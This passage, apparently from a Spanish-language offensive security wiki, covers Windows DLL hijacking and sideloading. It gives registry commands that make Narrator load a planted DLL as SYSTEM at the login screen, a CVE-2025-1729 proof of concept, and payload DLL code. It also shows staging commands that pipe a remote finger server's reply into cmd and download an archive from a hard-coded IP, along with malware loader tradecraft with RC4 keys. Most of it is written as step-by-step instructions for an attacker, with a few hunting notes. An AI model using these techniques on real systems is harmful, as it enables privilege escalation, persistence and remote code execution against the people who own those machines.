- Un hijack ingenuo mostrará/resaltará la UI. Para mantener el silencio, al adjuntarse enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y usa `SuspendThread` en él; continúa en tu propio hilo. Consulta el PoC para ver el código completo.<sup>[[8]](#references)</sup>

Activación y persistencia mediante la configuración de Accessibility
- Contexto del usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, iniciar Narrator carga la DLL plantada. En el secure desktop (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

Ejecución como SYSTEM activada mediante RDP (movimiento lateral)
- Permitir la capa de seguridad clásica de RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host; en la pantalla de inicio de sesión, pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando se cierra la sesión RDP: inyecta/migra rápidamente.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada del registro de una herramienta de Accessibility (AT) integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y, después, establecer `configuration` con el nombre de esa AT. Esto actúa como proxy para una ejecución arbitraria bajo el framework de Accessibility.

Notas
- Escribir en `%windir%\System32` y cambiar valores de HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede residir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Caso práctico: CVE-2025-1729 - Escalada de privilegios usando TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), registrado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe`, ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 bajo el contexto del usuario conectado.
- **Permisos del directorio**: Escribible por `CREATOR OWNER`, lo que permite a los usuarios locales depositar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar `hostfxr.dll` primero desde su directorio de trabajo y registra "NAME NOT FOUND" si falta, lo que indica que la búsqueda en el directorio local tiene precedencia.

### Implementación del exploit

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio, aprovechando la DLL ausente para lograr la ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo del ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM bajo el contexto del usuario actual.
3. Si hay un administrador conectado cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de bypass de UAC para elevarse de integridad media a privilegios de SYSTEM.

## Caso práctico: MSI CustomAction Dropper + DLL Side-Loading mediante un Signed Host (wsc_proxy.exe)

Los actores de amenazas suelen combinar droppers basados en MSI con DLL Side-Loading para ejecutar payloads bajo un proceso confiable y firmado.<sup>[[10]](#references)</sup>

Descripción de la cadena
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación GUI (por ejemplo, una acción LaunchApplication o VBScript) y reconstruye la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo y firmado, además de una DLL maliciosa, en el mismo directorio (par de ejemplo: wsc_proxy.exe firmado por Avast + wsc.dll controlado por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo, ejecutando el código del atacante bajo un proceso padre firmado (ATT&CK T1574.001).

Análisis de MSI (qué buscar)
- Tabla CustomAction:
- Busca entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo incrustado en segundo plano.
- En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads incrustados/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usa lessmsi: lessmsi x package.msi C:\out
- Busca varios fragmentos pequeños que se concatenen y descifren mediante una CustomAction de VBScript. Flujo habitual:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, crea una DLL proxy y reenvía los exports requeridos a la library legítima mientras ejecutas el payload en DllMain.
- Crea un payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para los requisitos de exportación, utiliza un framework de proxy (por ejemplo, DLLirant/Spartacus) para generar una DLL de forwarding que también ejecute tu payload.

- Esta técnica depende de la resolución de nombres de DLL por parte del binario host. Si el host utiliza rutas absolutas o indicadores de carga segura (por ejemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS y los exports forwarded pueden influir en la precedencia y deben tenerse en cuenta al seleccionar el binario host y el conjunto de exports.

## Triadas firmadas + payloads cifrados (caso de estudio de ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad mediante una **triada de tres archivos** para confundirse con software legítimo mientras mantiene el payload principal cifrado en disco:<sup>[[12]](#references)</sup>

1. **EXE host firmado** – se abusa de proveedores como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo, `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **DLL loader maliciosa** – se coloca junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su única función es localizar el blob cifrado, descifrarlo y realizar el mapeo reflectivo de ShadowPad.
3. **Blob de payload cifrado** – a menudo se almacena como `<name>.tmp` en el mismo directorio. Después de realizar el memory-mapping del payload descifrado, el loader elimina el archivo TMP para destruir la evidencia forense.

Notas de tradecraft:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en la cabecera PE) permite que se haga pasar por un binario de Windows y conserve la firma del proveedor; por tanto, replica el hábito de Ink Dragon de dejar binarios con apariencia de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de los controles de allowlisting solo necesitan que tu DLL maliciosa se encuentre junto a él. Concéntrate en personalizar la DLL loader; normalmente el parent firmado puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y pueda escribirse para poner a cero el archivo después del mapeo. Mantén el directorio escribible hasta que se cargue el payload; una vez en memoria, el archivo TMP puede eliminarse de forma segura para OPSEC.

### LOLBAS stager + cadena de sideloading de archivo staged (finger → tar/curl → WMI)

Los operadores combinan el DLL sideloading con LOLBAS para que el único artefacto personalizado en disco sea la DLL maliciosa junto al EXE de confianza:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell oculto inicia `cmd.exe /c`, obtiene comandos de un servidor Finger y los redirige a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtiene texto mediante TCP/79; `| cmd` ejecuta la respuesta del servidor, lo que permite a los operadores cambiar el servidor de la segunda etapa desde el lado del servidor.

- **Descarga/extracción integrada:** descarga un archivo con una extensión benigna, descomprímelo y prepara el objetivo del sideload junto con la DLL bajo una carpeta `%LocalAppData%` aleatoria:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue las redirecciones; `tar -xf` utiliza el tar integrado de Windows.

- **Lanzamiento mediante WMI/CIM:** inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL colocada junto a él:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binarios que prefieren DLLs locales (por ejemplo, `intelbq.exe`, `nearby_share.exe`); el payload (por ejemplo, Remcos) se ejecuta bajo el nombre de confianza.

- **Hunting:** genera una alerta sobre `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; es poco habitual fuera de los scripts de administración.


## Caso de estudio: dropper NSIS + sideload de Bitdefender Submission Wizard (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización de confianza para distribuir un dropper empaquetado con NSIS que preparaba un DLL sideload junto con payloads completamente en memoria.<sup>[[13]](#references)</sup>

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, una `log.dll` maliciosa y un blob cifrado `BluetoothService`, y después inicia el EXE.
- El EXE host importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo descifra con un stream basado en un LCG personalizado (constantes **0x19660D** / **0x3C6EF35F**, con el material de clave derivado de un hash anterior), sobrescribe el buffer con shellcode en texto plano, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs haciendo hash de los nombres de export mediante **FNV-1a basis 0x811C9DC5 + prime 0x100019**, y aplicando después un avalanche de estilo Murmur (**0x85EBCA6B**) y comparando con hashes objetivo con salt.

Shellcode principal (Chrysalis)
- Descifra un módulo principal similar a PE repitiendo add/XOR/sub con la clave `gQ2JR&9;` durante cinco pasadas; después carga dinámicamente `Kernel32.dll` → `GetProcAddress` para completar la resolución de imports.
- Reconstruye las cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones de bit-rotate/XOR por carácter; después carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utiliza un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, analiza cada tabla de exports en bloques de 4 bytes con mixing de estilo Murmur y solo recurre a `GetProcAddress` si no encuentra el hash.

Configuración embebida y C2
- La configuración se encuentra dentro del archivo `BluetoothService` dejado en el **offset 0x30808** (tamaño **0x980**) y se descifra mediante RC4 con la clave `qwhvb^435h&*7`, revelando la URL de C2 y el User-Agent.
- Los beacons construyen un perfil de host delimitado por puntos, anteponen la etiqueta `4Q` y después lo cifran con RC4 usando la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` mediante HTTPS. Las respuestas se descifran con RC4 y se distribuyen mediante un switch de etiquetas (`4T` shell, `4V` ejecución de procesos, `4W/4X` escritura de archivos, `4Y` lectura/exfil, `4\\` desinstalación, `4` enumeración de unidades/archivos + casos de transferencia por chunks).
- El modo de ejecución se controla mediante argumentos CLI: sin argumentos = instala persistencia (service/Run key) apuntando a `-i`; `-i` vuelve a iniciar el proceso con `-k`; `-k` omite la instalación y ejecuta el payload.

Loader alternativo observado
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` junto a él. El código fuente C proporcionado por el atacante contenía shellcode, que se compilaba y ejecutaba en memoria sin tocar el disco con un PE. Replícalo con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compilación y ejecución basada en TCC importaba `Wininet.dll` en runtime y extraía un shellcode de segunda etapa desde una URL codificada, proporcionando un loader flexible que se hacía pasar por una ejecución del compilador.

## Signed-host sideloading con export proxying + host thread parking

Algunas cadenas de DLL sideloading incorporan **ingeniería de estabilidad** para que el host legítimo permanezca activo el tiempo suficiente para cargar correctamente las etapas posteriores, en lugar de bloquearse después de cargar la DLL maliciosa.<sup>[[11]](#references)</sup>

Patrón observado
- Colocar un EXE confiable junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa hace **proxy de cada export esperado** hacia la DLL del sistema real (por ejemplo, `%SystemRoot%\\System32\\version.dll`), de modo que la resolución de imports siga funcionando y el proceso host continúe operativo.
- Después de la carga, la DLL maliciosa **parchea el entry point del host** para que el thread principal entre en un bucle infinito de `Sleep`, en lugar de salir o ejecutar rutas de código que terminarían el proceso.
- Un thread nuevo realiza el trabajo malicioso real: descifra el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son comunes) y después la ejecuta con `LoadLibrary`.

Por qué es importante
- El proxying normal de DLL conserva la compatibilidad de la API, pero no garantiza que el host permanezca activo el tiempo suficiente para las etapas posteriores.
- Mantener el thread principal en `Sleep(INFINITE)` es una forma sencilla de mantener residente el proceso firmado mientras el loader realiza el descifrado, el staging o el arranque de red en un worker thread.
- Buscar únicamente una `DllMain` sospechosa puede hacer que se pase por alto este patrón si el comportamiento interesante ocurre después de parchear el entry point del host y de iniciar un thread secundario.

Flujo de trabajo mínimo
1. Copiar el EXE del host firmado y determinar qué DLL resuelve desde el directorio local.
2. Compilar una DLL proxy que exporte las mismas funciones y las reenvíe a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crear un worker thread.
4. Desde ese thread, parchear el entry point del host o la rutina de inicio del thread principal para que entre en un bucle con `Sleep`.
5. Descifrar el nombre/configuración de la DLL de la siguiente etapa y llamar a `LoadLibrary` o hacer manual-map del payload.

Puntos de apoyo defensivos
- Procesos firmados que cargan `version.dll` u otras bibliotecas comunes desde su propio directorio de aplicación en lugar de `System32`.
- Parches de memoria en el entry point del proceso poco después de cargar la imagen, especialmente saltos/llamadas redirigidos a `Sleep`/`SleepEx`.
- Threads creados por una DLL proxy que llaman inmediatamente a `LoadLibrary` sobre una segunda DLL cuyo nombre ha sido descifrado.
- DLL proxy con todos los exports colocadas junto a ejecutables de proveedores dentro de directorios de staging con permisos de escritura, como `ProgramData`, `%TEMP%` o rutas de archivos descomprimidos.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
